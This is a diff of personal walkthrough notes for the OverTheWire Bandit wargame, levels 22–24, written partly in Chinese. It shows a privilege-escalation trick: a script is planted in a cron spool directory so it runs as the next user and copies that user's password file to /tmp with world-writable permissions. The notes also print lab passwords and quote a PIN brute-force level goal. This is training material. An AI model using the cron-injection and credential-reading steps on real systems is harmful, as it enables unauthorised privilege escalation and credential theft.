@@ -1,11 +1,6 @@
-# overthewire
+# overthewire_bandit
 
-## list
-
-| No. | Puzzle Name             | State                       | Link                                                                                                                                                                                                                                                                                                                                                                                                 |
-|-----|-------------------------| ----------------------------| ---------------------------------------------------------------------|
-| 1   | Bandit Level 0          | :heavy_check_mark:Completed | https://overthewire.org/wargames/bandit/bandit0.html                                                                                                                                                                                                                                |
-| 2   | Persistent Bugger.      | :x: Not Completed           |
+[toc]
 
 # `bandit0@bandit.labs.overthewire.org -p 2220`
 
@@ -850,7 +845,6 @@ cat /etc/bandit_pass/$myname > /tmp/$mytarget
   - the hash function analyzes the input in our example below the text fox, then the hash function outputs a string of text that represents the text fox.
 - The outputs are unique with the md5 sum function.
 
-
 # output that the script is copying the password for the level and to a file in the temp folder.
 bandit22@bandit:/etc/cron.d$ /usr/bin/cronjob_bandit23.sh
 Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
@@ -867,18 +861,16 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 ---
 
-## Bandit Level 23 → Level 24
+## Bandit Level 23 → Level 24 `cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass`
 Level Goal
-- A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
-
-NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
-
-NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
-
+- A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.
+- NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+- NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
 
 ```py
 bandit23@bandit:/etc/cron.d$ ls
 atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+
 bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
 @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
 * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
@@ -893,25 +885,61 @@ for i in * .*;
 do
     if [ "$i" != "." -a "$i" != ".." ];
     then
-	echo "Handling $i"
-	timeout -s 9 60 ./$i
-	rm -f ./$i
+      echo "Handling $i"
+	    timeout -s 9 60 ./$i
+	    rm -f ./$i      # ./$i means each file will be executed and the ‘rm -f $i’ will force remove it.
     fi
 done
-
-bandit23@bandit:/etc/cron.d$
-
-myname=$(whoami)
-cat /etc/bandit_pass/$myname > /tmp/$myname.txt
-
-
-
 ```
 
+What does this mean to us?
+- a script that is running commands at the `user permission level of Bandit24`.
+  - That means that we could possibly inject our own script to be run if we put a script of our own into the `/var/spool/bandit24` directory.
+- the password was stored in `/etc/bandit_pass/` so bandit24 password is there as well
 
 
+- `/var/spool/cron/` 这个目录下存放的是每个用户包括root的`crontab`任务
+  - 每个任务以创建者的名字命名，tom建的crontab任务文件就是/var/spool/cron/tom。
+  - 一般一个用户最多只有一个crontab文件。
+- 我们在`/var/spool/bandit24`目录下就可以运行`bandit24`的定时任务
+- 创建一个放在改目录下的脚本就可以执行了
+- `vim getpass.sh`进入vim编辑模式输入脚本
+- 写入 `cat /etc/bandit_pass/bandit24 > /tmp/bandit24pass`
+- `：wq`保存退出
+
+```py
+# go ahead and create a temporary directory.
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/grace44
+bandit23@bandit:/etc/cron.d$ cd /tmp/grace44
+bandit23@bandit:/tmp/grace44$ nano
+
+# open Nano we will go ahead and write our own script to inject.
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass      
+# reading the contents of the bandit24 password file (/etc/bandit_pass/bandit24)
+# and sending its output into a file that our bandit23 user account can see. (tmp/jhalon/pass)
+#Save this new script as script.sh.
 
 
+$ chmod 777 script.sh
+# make our script executable by bandit24. 777 is excessive for permissions
+# can also chmod -R 777 your tmp file in order to ls your files if you’re finding not listing your directory to be irritating.
+
+
+$ cp script.sh /var/spool/bandit24
+# copy script into the /var/spool/bandit24 folder.
+
+# Give it a minute to allow the cron job to run and then cat the file you specified as output.
+$ dir -a
+.  ..  pass  script.sh
+$ cat /tmp/jhalon/pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+## Bandit Level 24 → Level 25
+Level Goal
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 
 
 
